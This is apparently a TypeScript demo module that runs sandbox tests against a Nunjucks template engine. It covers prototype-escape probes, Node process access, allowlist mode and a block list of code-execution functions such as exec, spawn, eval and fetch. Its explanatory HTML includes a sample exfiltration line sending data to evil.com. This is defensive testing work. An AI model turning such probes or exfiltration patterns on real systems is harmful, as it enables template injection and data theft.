import type { NunjucksConfig } from '@nunjucks/core';
import { isErr, isOk, type Result } from '@nunjucks/lib';
import { renderDemoTemplate } from './render-template.ts';

interface TestCase {
  name: string;
  template: string;
  sandbox?: boolean;
  shouldPass?: boolean;
  context?: Record<string, unknown>;
  security?: NunjucksConfig['security'];
}

type TestOutcome = Result<string, Error>;

interface SandboxTestResult {
  name: string;
  outcome: TestOutcome;
  blocked: boolean;
  passed: boolean | null;
}

type SuiteStatusMode = 'blocked' | 'normal' | 'allowlist';

interface SandboxSuite {
  key: string;
  title: string;
  headingColor: string;
  accentColor: string;
  statusMode: SuiteStatusMode;
  introHtml: string | null;
  outroHtml: string | null;
  tests: TestCase[];
  context: Record<string, unknown>;
  config: NunjucksConfig;
}

interface RunTestsInput {
  tests: TestCase[];
  context: Record<string, unknown>;
  config?: NunjucksConfig;
}

// WHY: dangerous references arrive from the shell route (mirroring the probe injection in
// routes/errors.ts) so this domain data stays free of Node-environment coupling.
interface DangerousContextValues {
  process: unknown;
}

/**
 * Runs a suite's test cases through `renderDemoTemplate`, merging per-test
 * `sandbox`/`security` overrides into the suite config and mapping each `Result` to a
 * row with `blocked` and `passed` verdicts.
 */
const runTests = async ({
  tests,
  context,
  config = {},
}: RunTestsInput): Promise<SandboxTestResult[]> =>
  Promise.all(
    tests.map(async (test): Promise<SandboxTestResult> => {
      const testConfig: NunjucksConfig =
        test.sandbox === undefined && test.security === undefined
          ? config
          : {
              ...config,
              security: { ...config.security, ...test.security, sandbox: test.sandbox },
            };
      const result = await renderDemoTemplate(test.template, {
        context: test.context ?? context,
        config: testConfig,
      });
      const blocked = isErr(result);
      const passed = test.shouldPass === undefined ? null : isOk(result) === test.shouldPass;
      return { name: test.name, outcome: result, blocked, passed };
    })
  );

const outcomeError = (row: SandboxTestResult): Error | null =>
  row.outcome.ok ? null : row.outcome.error;

const outcomeOutput = (row: SandboxTestResult): string => (row.outcome.ok ? row.outcome.value : '');

const prototypeEscapeKeys = new Set(['__proto__', 'constructor', 'prototype']);

// WHY: the engine's prototype-escape guard is unconditional — inherited proto/constructor reads
// render as not-found ("undefined") even in default mode; sandbox mode only upgrades that to a throw.
const isPrototypeEscapeProbe = (row: SandboxTestResult): boolean => {
  for (const key of prototypeEscapeKeys) {
    if (row.name.includes(key)) {
      return true;
    }
  }
  return false;
};

const classifyStatus = (
  row: SandboxTestResult,
  suite: SandboxSuite
): { className: string; label: string } => {
  switch (suite.statusMode) {
    case 'blocked':
      return {
        className: row.blocked ? 'blocked' : 'allowed',
        label: row.blocked ? 'Blocked (throws)' : 'Allowed',
      };
    case 'normal':
      if (isPrototypeEscapeProbe(row)) {
        return { className: 'blocked', label: 'Blocked (renders undefined)' };
      }
      return {
        className: '',
        label: outcomeError(row) !== null ? 'Error' : 'Allowed',
      };
    case 'allowlist':
      return {
        className: row.passed ? 'passed' : 'failed',
        label: row.passed ? 'Correct' : 'Unexpected',
      };
  }
};

const statusClass = (row: SandboxTestResult, suite: SandboxSuite): string =>
  classifyStatus(row, suite).className;

const statusLabel = (row: SandboxTestResult, suite: SandboxSuite): string =>
  classifyStatus(row, suite).label;

export type { SandboxSuite, SandboxTestResult };
export {
  classifyStatus,
  createSandboxSuites,
  outcomeError,
  outcomeOutput,
  runTests,
  statusClass,
  statusLabel,
};

/**
 * Builds the four demo suites (sandbox, normal, allowlist, code-execution); dangerous
 * references such as `process` are injected by the shell route to keep this module
 * environment-neutral.
 */
const createSandboxSuites = (dangerousValues: DangerousContextValues): SandboxSuite[] => [
  {
    key: 'test',
    title: 'Sandbox Test Results',
    headingColor: '#2c3e50',
    accentColor: '#3498db',
    statusMode: 'blocked',
    introHtml: null,
    outroHtml: null,
    context: {
      user: {
        name: 'John',
        admin: true,
        data: { secret: 'EXAMPLE_API_KEY' },
      },
    },
    config: {},
    tests: [
      { name: 'Normal property', template: '{{ user.name }}', sandbox: false },
      {
        name: 'Access __proto__ (blocked)',
        template: '{{ user.__proto__ }}',
        sandbox: true,
      },
      {
        name: 'Access constructor (blocked)',
        template: '{{ user.constructor }}',
        sandbox: true,
      },
      {
        name: 'Access toString (blocked)',
        template: '{{ user.toString }}',
        sandbox: true,
      },
      {
        // WHY: process is context-injected (mirroring /errors/sandbox-process) so the
        // contextStrict scanner must reject it — `{{ this.process }}` never resolved to anything.
        // The reference itself is threaded in by the shell route via dangerousValues.
        name: 'Access process (Node blocked)',
        template: '{{ user.process }}',
        sandbox: true,
        security: { contextStrict: 'error' },
        context: { user: { process: dangerousValues.process } },
      },
      {
        name: 'Access prototype (blocked)',
        template: '{{ user.prototype }}',
        sandbox: true,
      },
    ],
  },
  {
    key: 'normal',
    title: 'Normal Mode (No Sandbox)',
    headingColor: '#e74c3c',
    accentColor: '#e74c3c',
    statusMode: 'normal',
    introHtml:
      '<div class="info"><strong>Default mode is not defenseless:</strong> the engine\'s prototype-escape guard is ' +
      'unconditional — inherited <code>__proto__</code>/<code>constructor</code>/<code>prototype</code> reads render ' +
      'as not-found (<code>undefined</code>) without sandbox too, and the dev context scanner rejects dangerous ' +
      'context values outright. Sandbox mode additionally <em>throws</em> on masked keys and adds write/call gates.</div>',
    outroHtml: null,
    context: {
      user: {
        name: 'John',
        admin: true,
      },
    },
    config: {},
    tests: [
      { name: 'Normal property', template: '{{ user.name }}' },
      { name: 'Access __proto__', template: '{{ user.__proto__ }}' },
      { name: 'Access constructor', template: '{{ user.constructor }}' },
      {
        name: 'Context-injected process (dev scanner)',
        template: '{{ user.process }}',
        context: { user: { process: dangerousValues.process } },
      },
    ],
  },
  {
    key: 'allowlist',
    title: 'Allowlist Mode Demo',
    headingColor: '#8e44ad',
    accentColor: '#8e44ad',
    statusMode: 'allowlist',
    introHtml:
      "<div class=\"code\"><strong>Configuration:</strong><br/>sandbox: true<br/>sandboxAllowlist: ['user', 'name']<br/>sandboxMode: 'allowlist'</div>" +
      '<p>In allowlist mode, ONLY the specified keys are allowed. Everything else is blocked.</p>',
    outroHtml:
      '<h2>How It Works</h2>' +
      '<p>In blocklist mode (default), dangerous keys are blocked but everything else is allowed.<br/>' +
      'In allowlist mode, only explicitly whitelisted keys are allowed.</p>' +
      '<pre>{ sandbox: true }' +
      "{ sandbox: true, sandboxAllowlist: ['user', 'name'], sandboxMode: 'allowlist' }</pre>",
    context: {
      user: {
        name: 'John',
        password: 'example-secret',
        admin: true,
        data: { secret: 'EXAMPLE_API_KEY' },
      },
    },
    config: {
      security: {
        sandbox: true,
        sandboxAllowlist: ['user', 'name'],
        sandboxMode: 'allowlist',
      },
    },
    tests: [
      { name: 'user.name (allowed)', template: '{{ user.name }}', shouldPass: true },
      { name: 'user.password (blocked)', template: '{{ user.password }}', shouldPass: false },
      { name: 'user.admin (blocked)', template: '{{ user.admin }}', shouldPass: false },
      { name: 'user.data (blocked)', template: '{{ user.data }}', shouldPass: false },
    ],
  },
  {
    key: 'code-execution',
    title: 'Code Execution Blocking',
    headingColor: '#c0392b',
    accentColor: '#c0392b',
    statusMode: 'blocked',
    introHtml:
      '<div class="info"><strong>Blocked patterns:</strong> setTimeout, setInterval, setImmediate, requestAnimationFrame,<br/>exec, execSync, spawn, spawnSync, eval, Function, fetch, XMLHttpRequest</div>',
    outroHtml:
      '<h2>Why Block These?</h2>' +
      '<p>These functions can be used for code injection attacks:</p>' +
      '<ul>' +
      "<li><code>setTimeout('alert(1)', 0)</code> - Timing attack</li>" +
      '<li><code>eval(userInput)</code> - Direct code execution</li>' +
      "<li><code>fetch('http://evil.com?data=' + userData)</code> - Data exfiltration</li>" +
      '</ul>',
    context: {
      user: {
        setTimeout: () => 'setTimeout',
        setInterval: () => 'setInterval',
        eval: () => 'eval',
        fetch: () => 'fetch',
        xml: () => 'XMLHttpRequest',
      },
    },
    config: { security: { sandbox: true } },
    tests: [
      {
        name: 'Access setTimeout (blocked)',
        template: '{{ user.setTimeout }}',
      },
      {
        name: 'Access setInterval (blocked)',
        template: '{{ user.setInterval }}',
      },
      {
        name: 'Access eval (blocked)',
        template: '{{ user.eval }}',
      },
      {
        name: 'Access fetch (blocked)',
        template: '{{ user.fetch }}',
      },
    ],
  },
];
